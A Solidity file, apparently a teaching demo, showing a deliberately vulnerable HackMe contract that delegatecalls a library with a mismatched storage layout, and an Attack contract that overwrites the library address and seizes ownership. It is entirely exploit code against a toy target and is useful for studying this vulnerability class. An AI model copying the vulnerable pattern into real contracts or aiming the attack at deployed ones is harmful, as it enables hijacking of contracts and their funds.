// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        //lib.delegatecall(abi.encodeWithSelector(Lib.doSomething.selector, _num));
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will be called
        hackMe.doSomething(1);
        someNumber++; // 这行少了无法攻击成功.
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}